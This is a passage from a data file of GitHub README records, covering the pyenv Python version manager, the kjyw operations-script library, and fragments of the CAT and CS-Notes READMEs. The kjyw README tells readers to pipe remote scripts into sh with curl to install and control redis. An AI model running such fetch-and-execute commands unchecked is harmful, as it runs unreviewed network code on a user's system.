[\u9879\u76ee\u67b6\u6784](https:\/\/github.com\/dianping\/cat\/wiki\/overall)\n- [\u5ba2\u6237\u7aef\u8bbe\u8ba1](https:\/\/github.com\/dianping\/cat\/wiki\/client)\n- [\u670d\u52a1\u7aef\u8bbe\u8ba1](https:\/\/github.com\/dianping\/cat\/wiki\/server)\n- [\u6a21\u578b\u8bbe\u8ba1](https:\/\/github.com\/dianping\/cat\/wiki\/model)\n\n### Copyright and License\n\n[Apache 2.0 License.](\/LICENSE)\n\n### CAT \u63a5\u5165\u516c\u53f8\n\n![Alt text](cat-home\/src\/main\/webapp\/images\/logo\/companys.png)\n\n\u66f4\u591a\u63a5\u5165\u516c\u53f8\uff0c\u6b22\u8fce\u5728 <https:\/\/github.com\/dianping\/cat\/issues\/753> \u767b\u8bb0\n\n### \u8054\u7cfb\u6211\u4eec\n\n\u6211\u4eec\u9700\u8981\u77e5\u9053\u4f60\u5bf9Cat\u7684\u4e00\u4e9b\u770b\u6cd5\u4ee5\u53ca\u5efa\u8bae\uff1a\n\n- Mail: cat@dianping.com\uff0c\n- [**Issues**](https:\/\/github.com\/dianping\/cat\/issues)\n"},{"repo":"\/pyenv\/pyenv","language":"Shell","readme_contents":"# Simple Python Version Management: pyenv\n\n[![Join the chat at https:\/\/gitter.im\/yyuu\/pyenv](https:\/\/badges.gitter.im\/Join%20Chat.svg)](https:\/\/gitter.im\/yyuu\/pyenv?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n[![Build Status](https:\/\/travis-ci.org\/pyenv\/pyenv.svg?branch=master)](https:\/\/travis-ci.org\/pyenv\/pyenv)\n\npyenv lets you easily switch between multiple versions of Python. It's\nsimple, unobtrusive, and follows the UNIX tradition of single-purpose\ntools that do one thing well.\n\nThis project was forked from [rbenv](https:\/\/github.com\/rbenv\/rbenv) and\n[ruby-build](https:\/\/github.com\/rbenv\/ruby-build), and modified for Python.\n\n![Terminal output example](\/terminal_output.png)\n\n\n### pyenv _does..._\n\n* Let you **change the global Python version** on a per-user basis.\n* Provide support for **per-project Python versions**.\n* Allow you to **override the Python version** with an environment\n  variable.\n* Search commands from **multiple versions of Python at a time**.\n  This may be helpful to test across Python versions with [tox](https:\/\/pypi.python.org\/pypi\/tox).\n\n\n### In contrast with pythonbrew and pythonz, pyenv _does not..._\n\n* **Depend on Python itself.** pyenv was made from pure shell scripts.\n    There is no bootstrap problem of Python.\n* **Need to be loaded into your shell.** Instead, pyenv's shim\n    approach works by adding a directory to your `$PATH`.\n* **Manage virtualenv.** Of course, you can create [virtualenv](https:\/\/pypi.python.org\/pypi\/virtualenv)\n    yourself, or [pyenv-virtualenv](https:\/\/github.com\/pyenv\/pyenv-virtualenv)\n    to automate the process.\n\n\n----\n\n\n## Table of Contents\n\n* **[How It Works](#how-it-works)**\n  * [Understanding PATH](#understanding-path)\n  * [Understanding Shims](#understanding-shims)\n  * [Choosing the Python Version](#choosing-the-python-version)\n  * [Locating the Python Installation](#locating-the-python-installation)\n* **[Installation](#installation)**\n  * [Basic GitHub Checkout](#basic-github-checkout)\n    * [Upgrading](#upgrading)\n    * [Homebrew on macOS](#homebrew-on-macos)\n    * [Advanced Configuration](#advanced-configuration)\n    * [Uninstalling Python Versions](#uninstalling-python-versions)\n* **[Command Reference](#command-reference)**\n* **[Development](#development)**\n  * [Version History](#version-history)\n  * [License](#license)\n\n\n----\n\n\n## How It Works\n\nAt a high level, pyenv intercepts Python commands using shim\nexecutables injected into your `PATH`, determines which Python version\nhas been specified by your application, and passes your commands along\nto the correct Python installation.\n\n### Understanding PATH\n\nWhen you run a command like `python` or `pip`, your operating system\nsearches through a list of directories to find an executable file with\nthat name. This list of directories lives in an environment variable\ncalled `PATH`, with each directory in the list separated by a colon:\n\n    \/usr\/local\/bin:\/usr\/bin:\/bin\n\nDirectories in `PATH` are searched from left to right, so a matching\nexecutable in a directory at the beginning of the list takes\nprecedence over another one at the end. In this example, the\n`\/usr\/local\/bin` directory will be searched first, then `\/usr\/bin`,\nthen `\/bin`.\n\n### Understanding Shims\n\npyenv works by inserting a directory of _shims_ at the front of your\n`PATH`:\n\n    $(pyenv root)\/shims:\/usr\/local\/bin:\/usr\/bin:\/bin\n\nThrough a process called _rehashing_, pyenv maintains shims in that\ndirectory to match every Python command across every installed version\nof Python\u2014`python`, `pip`, and so on.\n\nShims are lightweight executables that simply pass your command along\nto pyenv. So with pyenv installed, when you run, say, `pip`, your\noperating system will do the following:\n\n* Search your `PATH` for an executable file named `pip`\n* Find the pyenv shim named `pip` at the beginning of your `PATH`\n* Run the shim named `pip`, which in turn passes the command along to\n  pyenv\n\n### Choosing the Python Version\n\nWhen you execute a shim, pyenv determines which Python version to use by\nreading it from the following sources, in this order:\n\n1. The `PYENV_VERSION` environment variable (if specified). You can use\n   the [`pyenv shell`](https:\/\/github.com\/pyenv\/pyenv\/blob\/master\/COMMANDS.md#pyenv-shell) command to set this environment\n   variable in your current shell session.\n\n2. The application-specific `.python-version` file in the current\n   directory (if present). You can modify the current directory's\n   `.python-version` file with the [`pyenv local`](https:\/\/github.com\/pyenv\/pyenv\/blob\/master\/COMMANDS.md#pyenv-local)\n   command.\n\n3. The first `.python-version` file found (if any) by searching each parent\n   directory, until reaching the root of your filesystem.\n\n4. The global `$(pyenv root)\/version` file. You can modify this file using\n   the [`pyenv global`](https:\/\/github.com\/pyenv\/pyenv\/blob\/master\/COMMANDS.md#pyenv-global) command. If the global version\n   file is not present, pyenv assumes you want to use the \"system\"\n   Python. (In other words, whatever version would run if pyenv weren't in your\n   `PATH`.)\n\n**NOTE:** You can activate multiple versions at the same time, including multiple\nversions of Python2 or Python3 simultaneously. This allows for parallel usage of\nPython2 and Python3, and is required with tools like `tox`. For example, to set\nyour path to first use your `system` Python and Python3 (set to 2.7.9 and 3.4.2\nin this example), but also have Python 3.3.6, 3.2, and 2.5 available on your\n`PATH`, one would first `pyenv install` the missing versions, then set `pyenv\nglobal system 3.3.6 3.2 2.5`. At this point, one should be able to find the full\nexecutable path to each of these using `pyenv which`, e.g. `pyenv which python2.5`\n(should display `$(pyenv root)\/versions\/2.5\/bin\/python2.5`), or `pyenv which\npython3.4` (should display path to system Python3). You can also specify multiple\nversions in a `.python-version` file, separated by newlines or any whitespace.\n\n### Locating the Python Installation\n\nOnce pyenv has determined which version of Python your application has\nspecified, it passes the command along to the corresponding Python\ninstallation.\n\nEach Python version is installed into its own directory under\n`$(pyenv root)\/versions`.\n\nFor example, you might have these versions installed:\n\n* `$(pyenv root)\/versions\/2.7.8\/`\n* `$(pyenv root)\/versions\/3.4.2\/`\n* `$(pyenv root)\/versions\/pypy-2.4.0\/`\n\nAs far as pyenv is concerned, version names are simply the directories in\n`$(pyenv root)\/versions`.\n\n### Managing Virtual Environments\n\nThere is a pyenv plugin named [pyenv-virtualenv](https:\/\/github.com\/pyenv\/pyenv-virtualenv) which comes with various features to help pyenv users to manage virtual environments created by virtualenv or Anaconda.\nBecause the `activate` script of those virtual environments are relying on mutating `$PATH` variable of user's interactive shell, it will intercept pyenv's shim style command execution hooks.\nWe'd recommend to install pyenv-virtualenv as well if you have some plan to play with those virtual environments.\n\n\n----\n\n\n## Installation\n\nIf you're on macOS, consider [installing with Homebrew](#homebrew-on-macos).\n\nIf you're on Windows, consider using @kirankotari's [`pyenv-win`](https:\/\/github.com\/pyenv-win\/pyenv-win) fork. (`pyenv` does not work on windows outside the Windows Subsystem for Linux)\n\n### The automatic installer\n\nVisit my other project:\nhttps:\/\/github.com\/pyenv\/pyenv-installer\n\n\n### Basic GitHub Checkout\n\nThis will get you going with the latest version of pyenv and make it\neasy to fork and contribute any changes back upstream.\n\n1. **Check out pyenv where you want it installed.**\n   A good place to choose is `$HOME\/.pyenv` (but you can install it somewhere else).\n\n        $ git clone https:\/\/github.com\/pyenv\/pyenv.git ~\/.pyenv\n\n\n2. **Define environment variable `PYENV_ROOT`** to point to the path where\n   pyenv repo is cloned and add `$PYENV_ROOT\/bin` to your `$PATH` for access\n   to the `pyenv` command-line utility.\n\n    ```sh\n    $ echo 'export PYENV_ROOT=\"$HOME\/.pyenv\"' >> ~\/.bash_profile\n    $ echo 'export PATH=\"$PYENV_ROOT\/bin:$PATH\"' >> ~\/.bash_profile\n    ```\n    - **Zsh note**: Modify your `~\/.zshenv` file instead of `~\/.bash_profile`.\n    - **Ubuntu and Fedora note**: Modify your `~\/.bashrc` file instead of `~\/.bash_profile`.\n    - **Proxy note**: If you use a proxy, export `http_proxy` and `HTTPS_PROXY` too.\n\n3. **Add `pyenv init` to your shell** to enable shims and autocompletion.\n   Please make sure `eval \"$(pyenv init -)\"` is placed toward the end of the shell\n   configuration file since it manipulates `PATH` during the initialization.\n    ```sh\n    $ echo -e 'if command -v pyenv 1>\/dev\/null 2>&1; then\\n  eval \"$(pyenv init -)\"\\nfi' >> ~\/.bash_profile\n    ```\n    - **Zsh note**: Modify your `~\/.zshenv` file instead of `~\/.bash_profile`.\n    - **fish note**: Use `pyenv init - | source` instead of `eval (pyenv init -)`.\n    - **Ubuntu and Fedora note**: Modify your `~\/.bashrc` file instead of `~\/.bash_profile`.\n\n    **General warning**: There are some systems where the `BASH_ENV` variable is configured\n    to point to `.bashrc`. On such systems you should almost certainly put the abovementioned line\n    `eval \"$(pyenv init -)\"` into `.bash_profile`, and **not** into `.bashrc`. Otherwise you\n    may observe strange behaviour, such as `pyenv` getting into an infinite loop.\n    See [#264](https:\/\/github.com\/pyenv\/pyenv\/issues\/264) for details.\n\n4. **Restart your shell so the path changes take effect.**\n   You can now begin using pyenv.\n    ```sh\n    $ exec \"$SHELL\"\n    ```\n\n5. **Install Python build dependencies** before attempting to install a new Python version.  The\n   [pyenv wiki](https:\/\/github.com\/pyenv\/pyenv\/wiki) provides suggested installation packages\n   and commands for various operating systems.\n\n6. **Install Python versions into `$(pyenv root)\/versions`.**\n   For example, to download and install Python 2.7.8, run:\n    ```sh\n    $ pyenv install 2.7.8\n    ```\n   **NOTE:** If you need to pass configure option to build, please use\n   ```CONFIGURE_OPTS``` environment variable.\n\n   **NOTE:** If you want to use proxy to download, please use `http_proxy` and `https_proxy`\n   environment variable.\n\n   **NOTE:** If you are having trouble installing a python version,\n   please visit the wiki page about\n   [Common Build Problems](https:\/\/github.com\/pyenv\/pyenv\/wiki\/Common-build-problems)\n\n\n#### Upgrading\n\nIf you've installed pyenv using the instructions above, you can\nupgrade your installation at any time using git.\n\nTo upgrade to the latest development version of pyenv, use `git pull`:\n\n```sh\n$ cd $(pyenv root)\n$ git pull\n```\n\nTo upgrade to a specific release of pyenv, check out the corresponding tag:\n\n```sh\n$ cd $(pyenv root)\n$ git fetch\n$ git tag\nv0.1.0\n$ git checkout v0.1.0\n```\n\n### Uninstalling pyenv\n\nThe simplicity of pyenv makes it easy to temporarily disable it, or\nuninstall from the system.\n\n1. To **disable** pyenv managing your Python versions, simply remove the\n  `pyenv init` line from your shell startup configuration. This will\n  remove pyenv shims directory from PATH, and future invocations like\n  `python` will execute the system Python version, as before pyenv.\n\n  `pyenv` will still be accessible on the command line, but your Python\n  apps won't be affected by version switching.\n\n2. To completely **uninstall** pyenv, perform step (1) and then remove\n   its root directory. This will **delete all Python versions** that were\n   installed under `` $(pyenv root)\/versions\/ `` directory:\n    ```sh\n    rm -rf $(pyenv root)\n    ```\n   If you've installed pyenv using a package manager, as a final step\n   perform the pyenv package removal. For instance, for Homebrew:\n\n        brew uninstall pyenv\n\n### Homebrew on macOS\n\nYou can also install pyenv using the [Homebrew](https:\/\/brew.sh)\npackage manager for macOS.\n\n    $ brew update\n    $ brew install pyenv\n\n\nTo upgrade pyenv in the future, use `upgrade` instead of `install`.\n\nThen follow the rest of the post-installation steps under [Basic GitHub Checkout](https:\/\/github.com\/pyenv\/pyenv#basic-github-checkout) above, starting with #3 (\"Add `pyenv init` to your shell to enable shims and autocompletion\").\n\n### Advanced Configuration\n\nSkip this section unless you must know what every line in your shell\nprofile is doing.\n\n`pyenv init` is the only command that crosses the line of loading\nextra commands into your shell. Coming from rvm, some of you might be\nopposed to this idea. Here's what `pyenv init` actually does:\n\n1. **Sets up your shims path.** This is the only requirement for pyenv to\n   function properly. You can do this by hand by prepending\n   `$(pyenv root)\/shims` to your `$PATH`.\n\n2. **Installs autocompletion.** This is entirely optional but pretty\n   useful. Sourcing `$(pyenv root)\/completions\/pyenv.bash` will set that\n   up. There is also a `$(pyenv root)\/completions\/pyenv.zsh` for Zsh\n   users.\n\n3. **Rehashes shims.** From time to time you'll need to rebuild your\n   shim files. Doing this on init makes sure everything is up to\n   date. You can always run `pyenv rehash` manually.\n\n4. **Installs the sh dispatcher.** This bit is also optional, but allows\n   pyenv and plugins to change variables in your current shell, making\n   commands like `pyenv shell` possible. The sh dispatcher doesn't do\n   anything crazy like override `cd` or hack your shell prompt, but if\n   for some reason you need `pyenv` to be a real script rather than a\n   shell function, you can safely skip it.\n\nTo see exactly what happens under the hood for yourself, run `pyenv init -`.\n\n\n### Uninstalling Python Versions\n\nAs time goes on, you will accumulate Python versions in your\n`$(pyenv root)\/versions` directory.\n\nTo remove old Python versions, `pyenv uninstall` command to automate\nthe removal process.\n\nAlternatively, simply `rm -rf` the directory of the version you want\nto remove. You can find the directory of a particular Python version\nwith the `pyenv prefix` command, e.g. `pyenv prefix 2.6.8`.\n\n\n----\n\n\n## Command Reference\n\nSee [COMMANDS.md](COMMANDS.md).\n\n\n----\n\n## Environment variables\n\nYou can affect how pyenv operates with the following settings:\n\nname | default | description\n-----|---------|------------\n`PYENV_VERSION` | | Specifies the Python version to be used.<br>Also see [`pyenv shell`](https:\/\/github.com\/pyenv\/pyenv\/blob\/master\/COMMANDS.md#pyenv-shell)\n`PYENV_ROOT` | `~\/.pyenv` | Defines the directory under which Python versions and shims reside.<br>Also see `pyenv root`\n`PYENV_DEBUG` | | Outputs debug information.<br>Also as: `pyenv --debug <subcommand>`\n`PYENV_HOOK_PATH` | [_see wiki_][hooks] | Colon-separated list of paths searched for pyenv hooks.\n`PYENV_DIR` | `$PWD` | Directory to start searching for `.python-version` files.\n`PYTHON_BUILD_ARIA2_OPTS` | | Used to pass additional parameters to [`aria2`](https:\/\/aria2.github.io\/).<br>If the `aria2c` binary is available on PATH, pyenv uses `aria2c` instead of `curl` or `wget` to download the Python Source code. If you have an unstable internet connection, you can use this variable to instruct `aria2` to accelerate the download.<br>In most cases, you will only need to use `-x 10 -k 1M` as value to `PYTHON_BUILD_ARIA2_OPTS` environment variable\n\n\n\n## Development\n\nThe pyenv source code is [hosted on\nGitHub](https:\/\/github.com\/pyenv\/pyenv).  It's clean, modular,\nand easy to understand, even if you're not a shell hacker.\n\nTests are executed using [Bats](https:\/\/github.com\/sstephenson\/bats):\n\n    $ bats test\n    $ bats\/test\/<file>.bats\n\nPlease feel free to submit pull requests and file bugs on the [issue\ntracker](https:\/\/github.com\/pyenv\/pyenv\/issues).\n\n\n  [pyenv-virtualenv]: https:\/\/github.com\/pyenv\/pyenv-virtualenv#readme\n  [hooks]: https:\/\/github.com\/pyenv\/pyenv\/wiki\/Authoring-plugins#pyenv-hooks\n\n### Version History\n\nSee [CHANGELOG.md](CHANGELOG.md).\n\n### License\n\n[The MIT License](LICENSE)\n"},{"repo":"\/aqzt\/kjyw","language":"Shell","readme_contents":"# kjyw \u5feb\u6377\u8fd0\u7ef4\n\n\n## \u9879\u76ee\u7b80\u4ecb\n- \u5feb\u6377\u8fd0\u7ef4\uff0c\u4ee3\u53f7\uff1akjyw\uff0c\u8fd0\u7ef4\u811a\u672c\u5de5\u5177\u5e93\uff0c\u9879\u76ee\u57fa\u4e8eshell\u5f00\u53d1\uff0c\u6536\u96c6\u5404\u7c7b\u8fd0\u7ef4\u5e38\u7528\u5de5\u5177\u811a\u672c\uff1b\n- \u5b9e\u73b0\u5feb\u901f\u5b89\u88c5nginx\u3001mysql\u3001php\u3001redis\u3001nagios\u3001\u8fd0\u7ef4\u7ecf\u5e38\u4f7f\u7528\u7684\u811a\u672c\u7b49\u7b49... \n- \u7b80\u5355 \u9ad8\u6548 \u5feb\u6377\uff01\n- Linux\u4e0b\u5f88\u591a\u64cd\u4f5c\u547d\u4ee4\uff0c\u90fd\u53ef\u4ee5\u6839\u636e\u4e1a\u52a1\u9700\u6c42\u901a\u7528\u5316\uff0c\u811a\u672c\u5316\uff0c\u5173\u952e\u662f\u601d\u8def\uff0c\u5f88\u591aLAMP\/LNMP\u4e00\u952e\u5b89\u88c5\u5305\uff0c\u4e5f\u662f\u8fd9\u6837\u3002\n- \u811a\u672c\u5316\u540e\uff0c\u53ef\u4ee5\u7ed3\u5408\u4e00\u4e9b\u81ea\u52a8\u5316\u5de5\u5177\uff0c\u6279\u91cf\u90e8\u7f72\uff0c\u6bd4\u5982\u53ef\u4ee5\u7528ansible\u6765\u6279\u91cf\u6267\u884c\u811a\u672c\uff0c\u5c31\u53ef\u4ee5\u6279\u91cf\u90e8\u7f72\u670d\u52a1\u5668\u4e1a\u52a1\u3002\n- \u8fd9\u91cc\u9762\u7684\u811a\u672c\u662f\u8fd0\u7ef4\u7ecf\u5e38\u4f7f\u7528\u7684\u811a\u672c\uff0c\u65b9\u4fbf\u5927\u5bb6\u4f7f\u7528\uff01\n\n## \u5feb\u6377\u8fd0\u7ef4\u5b98\u65b9\u5730\u5740\n- \u5f00\u6e90\u4e2d\u56fd\u25cf\u7801\u4e91\u5730\u5740\uff1ahttps:\/\/gitee.com\/aqztcom\/kjyw.git\n- Github\u5730\u5740\uff1ahttps:\/\/github.com\/aqzt\/kjyw.git\n- \u76f8\u5173\u4f7f\u7528\u6587\u6863\uff1ahttps:\/\/bbs.aqzt.com\/forum-39-1.html\n\n## \u4e3a\u4ec0\u4e48\u8981\u505a\u5feb\u6377\u8fd0\u7ef4\uff1f\n- \u76f8\u4fe1\u5927\u5bb6\u90fd\u77e5\u9053\uff0c\u8fd0\u7ef4\u662f\u4e00\u9879\u975e\u5e38\u91cd\u8981\u4e14\u65f6\u6548\u6027\u8981\u6c42\u5f88\u9ad8\u7684\u5de5\u4f5c\uff0c\u9879\u76ee\u548c\u7a0b\u5e8f\u53d1\u5e03\uff0c\u5347\u7ea7\uff0c\u66f4\u65b0\u90fd\u5c11\u4e0d\u4e86\u8fd0\u7ef4\u7684\u64cd\u4f5c\uff0c\n- \u56e0\u6b64\u8fd0\u7ef4\u4e5f\u662f\u4e2a\u5c11\u4e0d\u4e86\u52a0\u73ed\u7684\u804c\u4e1a\u3002\u6211\u559c\u6b22\u8fd0\u7ef4\uff0c\u4f46\u6211\u4e5f\u4e0d\u5e0c\u671b\u7ecf\u5e38\u52a0\u73ed\u592a\u591a\uff0c\n- \u4e8e\u662f\u6211\u5c31\u601d\u8003\u5982\u4f55\u80fd\u4f18\u5316\u6211\u7684\u8fd0\u7ef4\u5de5\u4f5c\uff0c\u63d0\u9ad8\u6548\u7387\uff0c\u672c\u6765\u8981\u51e0\u4e2a\u5c0f\u65f6\u7684\u5de5\u4f5c\u4efb\u52a1\uff0c\u80fd\u5426\u5728\u51e0\u5206\u949f\u4e4b\u5185\u5b8c\u6210\u5462\uff1f\n\n## \u4f7f\u7528\u5feb\u6377\u8fd0\u7ef4\u811a\u672c\u7684\u597d\u5904\n- \u5de5\u4f5c\u4efb\u52a1\u53ef\u4ee5\u5feb\u901f\u5b8c\u6210\uff0c\u63d0\u9ad8\u6548\u7387\uff0c\u51cf\u5c11\u52a0\u73ed\uff0c\u8fd9\u6837\u5c31\u6709\u66f4\u591a\u7684\u65f6\u95f4\u966a\u5bb6\u4eba\uff0c\u6216\u505a\u5176\u4ed6\u4e8b\u60c5\u5566\uff01\n- \u53ef\u4ee5\u548c\u81ea\u52a8\u5316\u5de5\u5177\u7ed3\u5408\uff0c\u6279\u91cf\u90e8\u7f72\u4e1a\u52a1\uff0c\u5982\u679c\u67093-5\u53f0\u670d\u52a1\u5668\uff0c\u76f4\u63a5SSH\u8fdc\u7a0b\u7f16\u8bd1\u5b89\u88c5\uff0c\n- \u5982\u679c\u51e0\u5341\u53f0\u670d\u52a1\u5668\uff0c\u4e0a\u767e\u53f0\u670d\u52a1\u5668\uff0c\u4e0a\u5343\u53f0\u670d\u52a1\u5668\u90fd\u8981\u5b89\u88c5\u67d0\u4e2a\u5e94\u7528\u5462\uff1f\n- \u53ef\u4ee5\u7528\u5feb\u6377\u8fd0\u7ef4\u811a\u672c\u7ed3\u5408\u81ea\u52a8\u5316\u5de5\u5177\uff08\u6bd4\u5982\uff1aansible\uff09\uff0c\u6279\u91cf\u63a8\u9001\u6267\u884c\u811a\u672c\u5373\u53ef\u3002\n- \u77e5\u540dCEO\u8bf4\u8fc7\uff1a\u201c\u5728\u8fd9\u4e2a\u7eb7\u7e41\u590d\u6742\u7684\u4e16\u754c\u4e0a\uff0c\u51b3\u7b56\u6bd4\u522b\u4eba\u5feb\uff0c\u5f88\u53ef\u80fd\u5c31\u8d62\u4e86\u201d\uff0c\u505a\u6b63\u786e\u51b3\u7b56\u6bd4\u522b\u4eba\u5feb\uff0c\u4f60\u5c31\u8d62\u4e86\u3002\n- \u5728\u90e8\u7f72\u8fd0\u7ef4\u9700\u6c42\u7684\u65f6\u5019\uff0c\u90e8\u7f72\u6548\u679c\u4e00\u6837\u7684\u60c5\u51b5\u4e0b\uff0c\u4f60\u6bd4\u5176\u4ed6\u4eba\u90e8\u7f72\u5feb\uff0c\u4f60\u5c31\u6bd4\u5176\u4ed6\u4eba\u66f4\u4f18\u79c0\u3002\n\n## \u4f7f\u7528\u573a\u666f\n- \u3010\u4e3e\u4e2a\u4f8b\u5b50\u3011\n- \u67d0\u5929\uff0c\u67d0\u4eba\uff0c\u56e0\u67d0\u4e1a\u52a1\uff0c\u6709redis\u90e8\u7f72\u9700\u6c42\uff0c\u9700\u8981\u6279\u91cf\u90e8\u7f72\u4e00\u7ec4redis\u670d\u52a1\uff0c\u7aef\u53e3\u4ece8001\u52308009\uff0c\n- \u7b80\u5355\uff0c\u9a6c\u4e0a\u5f00\u59cb\u90e8\u7f72\uff0c\u7f16\u8bd1redis\uff0c\u62f7\u8d1dredis\u6267\u884c\u6587\u4ef6\uff0c\u914d\u7f6e\u6587\u4ef6\uff0c8001\u7aef\u53e3\uff0c\u542f\u52a8\uff0c\u518d\u62f7\u8d1dredis\u6267\u884c\u6587\u4ef6\uff0c\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c8002\u2026\u2026\u2026\u2026\n- \u534a\u5c0f\u65f6\u540e\u90e8\u7f72\u597d\u4e86\uff0c\u5b8c\u6210\uff01\n- \u6709\u6ca1\u6709\u66f4\u597d\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387\uff0c\u5feb\u901f\u5b8c\u6210\u5462\uff1f\n- \u5982\u679c\u7528\u811a\u672c\u90e8\u7f72\uff0c\u53ea\u9700\u89811\u5206\u949f\u641e\u5b9a\uff0c\u4e3b\u8981\u662f\u7f16\u8bd1redis\u65f6\u95f4\uff0c\u5927\u5927\u63d0\u9ad8\u6548\u7387\uff0c\u5feb\u6377\uff0c\u5feb\u6377\uff0c\u5feb\u6377\u554a\uff01\n- \u7b2c\u4e00\u6b65 \u7f16\u8bd1redis\n- curl -s https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/redis\/install.sh | sh\n- \u7b2c\u4e8c\u6b65 \u62f7\u8d1dredis\u6267\u884c\u6587\u4ef6\uff0c\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u542f\u52a8\n- curl -s https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/redis\/redis_port.sh | sh -s  install 8001 8009\n- \u5b8c\u6210\uff01\n- ![image](https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/images\/redis1.gif)\n- \u6279\u91cf\u5173\u95edredis\u7aef\u53e3 8001\u52308009\n- curl -s https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/redis\/redis_port.sh  | sh -s  stop 8001 8009\n- ![image](https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/images\/redis2.gif)\n- \u6279\u91cf\u542f\u52a8redis\u7aef\u53e3 8001\u52308009\n- curl -s https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/redis\/redis_port.sh  | sh -s  start 8001 8009 \n- ![image](https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/images\/redis3.gif)\n- \u5feb\u6377\u8fd0\u7ef4\u8fd8\u6709\u5176\u4ed6\u8fd0\u7ef4\u7ecf\u5e38\u4f7f\u7528\u7684\u811a\u672c\uff0c\u65b9\u4fbf\u4f7f\u7528\uff0c\u63d0\u9ad8\u6548\u7387\uff01\n\n\n## \u9002\u5408\u4f7f\u7528\u5feb\u6377\u8fd0\u7ef4\u811a\u672c\u7684\u804c\u4e1a\n- \u8fd0\u7ef4\u5de5\u7a0b\u5e08  \uff08\u65b9\u4fbf\u8fd0\u7ef4\u5de5\u7a0b\u5e08\u642d\u5efa\u4e1a\u52a1\u751f\u4ea7\u73af\u5883\uff0c\u6700\u597d\u5148\u6d4b\u8bd5\u811a\u672c\uff0c\u5728\u7528\u4e8e\u751f\u4ea7\u73af\u5883\uff09\n- \u5f00\u53d1\u5de5\u7a0b\u5e08  \uff08\u65b9\u4fbf\u5f00\u53d1\u5de5\u7a0b\u5e08\u642d\u5efa\u5f00\u53d1\u73af\u5883\uff09\n- \u6d4b\u8bd5\u5de5\u7a0b\u5e08  \uff08\u65b9\u4fbf\u6d4b\u8bd5\u5de5\u7a0b\u5e08\u642d\u5efa\u6d4b\u8bd5\u73af\u5883\uff09\n\n\n## \u4e00\u8d77\u6765\u53c2\u4e0e\uff0c\u5206\u4eab\u6216\u662f\u4ea4\u6d41\n- \u4e00\u8d77\u53c2\u4e0e\u5b8c\u5584\u5feb\u6377\u8fd0\u7ef4\u811a\u672c\u5de5\u5177\u5e93\uff0c\u5f88\u591a\u811a\u672c\u90fd\u53ef\u4ee5\u590d\u7528\uff0c\u6216\u8005\u6539\u6539\u5c31\u53ef\u4ee5\u9002\u7528\u67d0\u4e1a\u52a1\u9700\u6c42\uff0c\u63d0\u9ad8\u5de5\u4f5c\u6548\u7387\uff01\n- \u5982\u679c\u60f3\u5206\u4eab\u6216\u662f\u4ea4\u6d41\u7684\u8bdd\uff0c\u8bf7\u52a0 QQ \u7fa4\uff1a 7652650 \uff08\u5b89\u5168\u8fd0\u7ef4\uff09\n- Email\uff1appabc@qq.com\n\n\n## \u5fae\u4fe1\u5173\u6ce8\n\n![image](https:\/\/git.oschina.net\/aqztcom\/kjyw\/raw\/master\/images\/aqzt.jpg)\n\n- \u8fd0\u7ef4\u5c31\u662f\u8e29\u5751\uff0c\u8e29\u5751\u7684\u6700\u9ad8\u5883\u754c\u5c31\u662f\uff1a\u8e29\u904d\u6240\u6709\u7684\u5751\uff0c\u8ba9\u522b\u4eba\u65e0\u5751\u53ef\u8e29\uff01\n- \u505a\u4e8b\u7684\u5b97\u65e8\u662f\uff1a\u4e00\u6761\u547d\u4ee4\u7684\u4e8b\uff0c\u4e00\u4e2a\u811a\u672c\u7684\u4e8b\uff01\n\n"},{"repo":"\/CyC2018\/CS-Notes","language":"Java","readme_contents":"<div align=\"center\">\n    <a href=\"https:\/\/gitstar-ranking.com\/repositories\"> <img src=\"https:\/\/badgen.net\/badge\/Rank\/20?icon=github&color=4ab8a1\"><\/a>\n    <a href=\"assets\/download.md\"> <img src=\"https:\/\/badgen.net\/badge\/OvO\/%E7%A6%BB%E7%BA%BF%E4%B8%8B%E8%BD%BD?icon=telegram&color=4ab8a1\"><\/a>\n    <a href=\"https:\/\/cyc2018.github.io\/CS-Notes\"> <img src=\"https:\/\/badgen.net\/badge\/CyC\/%E5%9C%A8%E7%BA%BF%E9%98%85%E8%AF%BB?icon=sourcegraph&color=4ab8a1\"><\/a>\n    <a href=\"#\u5fae\u4fe1\u516c\u4f17\u53f7\"> <img src=\"https:\/\/badgen.net\/badge\/%e5%85%ac%e4%bc%97%e5%8f%b7\/CyC2018?icon=rss&color=4ab8a1\"><\/a>\n<\/div>\n<br>\n\n| &nbsp;\u7b97\u6cd5&nbsp; | \u64cd\u4f5c\u7cfb\u7edf | &nbsp;\u7f51\u7edc&nbsp;|\u9762\u5411\u5bf9\u8c61| &nbsp;&nbsp;\u6570\u636e\u5e93&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;Java&nbsp;&nbsp;&nbsp;|         \u7cfb\u7edf\u8bbe\u8ba1| &nbsp;&nbsp;&nbsp;\u5de5\u5177&nbsp;&nbsp;&nbsp; |\u7f16\u7801\u5b9e\u8df5| &nbsp;&nbsp;&nbsp;\u540e\u8bb0&nbsp;&nbsp;&nbsp; |\n| :---: | :----: | :---: | :----: | :----: | :----: | :----: | :----: | :----: | :----: |\n| [:pencil2:](#pencil2-\u7b97\u6cd5) | [:computer:](#computer-\u64cd\u4f5c\u7cfb\u7edf) | [:cloud:](#cloud-\u7f51\u7edc) | [:art:](#art-\u9762\u5411\u5bf9\u8c61) | [:floppy_disk:](#floppy_disk-\u6570\u636e\u5e93) |[:coffee:](#coffee-java)| [:bulb:](#bulb-\u7cfb\u7edf\u8bbe\u8ba1) |[:wrench:](#wrench-\u5de5\u5177)| [:watermelon:](#watermelon-\u7f16\u7801\u5b9e\u8df5) |[:memo:](#memo-\u540e\u8bb0)|\n\n<br>\n\n<div align=\"center\">\n    <img src=\"https:\/\/cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com\/githubio\/LogoMakr_0zpEzN.png\" width=\"200px\">\n<\/div>\n\n\n\n<br>\n\n## :pencil2: \u7b97\u6cd5\n\n- 